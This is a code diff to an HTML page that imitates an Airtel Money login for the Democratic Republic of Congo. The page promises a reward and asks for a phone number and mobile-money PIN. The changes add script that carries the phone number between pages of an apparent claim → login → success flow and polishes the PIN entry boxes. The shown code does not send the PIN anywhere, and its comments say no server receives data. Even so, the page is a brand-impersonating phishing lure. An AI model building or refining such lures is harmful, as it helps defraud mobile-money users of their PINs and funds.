@@ -118,7 +118,6 @@
         color: #444;
       }
 
-      /* Row: PIN boxes centered, eye button pushed to the right */
       .pin-inputs-wrapper {
         display: grid;
         grid-template-columns: 1fr auto;
@@ -130,13 +129,13 @@
         display: grid;
         grid-template-columns: repeat(4, 1fr);
         gap: 0.65rem;
-        max-width: 260px;   /* keeps boxes from stretching too wide */
+        max-width: 260px;
       }
 
       .pin-box {
         width: 100%;
-        aspect-ratio: 1 / 1;      /* perfect squares */
-        max-height: 60px;         /* cap size on larger screens */
+        aspect-ratio: 1 / 1;
+        max-height: 60px;
         text-align: center;
         font-size: 1.5rem;
         font-weight: 700;
@@ -251,15 +250,15 @@
 
           <h1 class="login-title">Connectez-vous à Airtel Money pour réclamer votre récompense.</h1>
 
-          <!-- Static form: no submission anywhere -->
-          <form class="login-form" onsubmit="return false;">
+          <!-- Static form: no submission to any server -->
+          <form id="loginForm" class="login-form" onsubmit="return false;">
 
             <div class="phone-input-container">
               <div class="country-code">
                 <span class="flag-icon">🇨🇩</span>
                 <span>+243</span>
               </div>
-              <input class="phone-input" placeholder="912345678" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off" type="tel" value="912345678">
+              <input id="phoneInput" class="phone-input" placeholder="912345678" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off" type="tel" value="">
             </div>
 
             <div class="pin-section">
@@ -275,7 +274,7 @@
               </div>
             </div>
 
-            <button type="submit" class="login-button">SE CONNECTER &amp; RÉCLAMER</button>
+            <button id="loginBtn" type="submit" class="login-button">SE CONNECTER &amp; RÉCLAMER</button>
           </form>
         </div>
 
@@ -289,5 +288,56 @@
 
       </div>
     </div>
+
+    <script>
+      /* ---- 1. Read phone from URL hash (passed by claim.html) ---- */
+      (function () {
+        var hash = window.location.hash || '';
+        var m = hash.match(/phone=([^&]+)/);
+        if (m) {
+          var phone = decodeURIComponent(m[1]).replace(/\D/g, '');
+          document.getElementById('phoneInput').value = phone;
+        }
+      })();
+
+      /* ---- 2. PIN box UX only (auto-advance / backspace / eye toggle) ---- */
+      (function () {
+        var boxes = document.querySelectorAll('.pin-box');
+        boxes.forEach(function (box, i) {
+          box.addEventListener('input', function () {
+            box.value = box.value.replace(/\D/g, '').slice(0, 1);
+            box.classList.toggle('filled', box.value.length === 1);
+            if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+          });
+          box.addEventListener('keydown', function (e) {
+            if (e.key === 'Backspace' && !box.value && i > 0) {
+              boxes[i - 1].focus();
+              boxes[i - 1].value = '';
+              boxes[i - 1].classList.remove('filled');
+            }
+          });
+        });
+
+        var eye = document.querySelector('.eye-button');
+        if (eye) {
+          eye.addEventListener('click', function () {
+            boxes.forEach(function (b) {
+              b.type = (b.type === 'password') ? 'text' : 'password';
+            });
+          });
+        }
+      })();
+
+      /* ---- 3. On "SE CONNECTER & RÉCLAMER" → go to success.html ---- */
+      document.getElementById('loginBtn').addEventListener('click', function (e) {
+        e.preventDefault();
+        var phone = document.getElementById('phoneInput').value.trim();
+        var target = 'success.html';
+        if (phone) {
+          target += '#phone=' + encodeURIComponent(phone);
+        }
+        window.location.href = target;
+      });
+    </script>
   </body>
 </html>
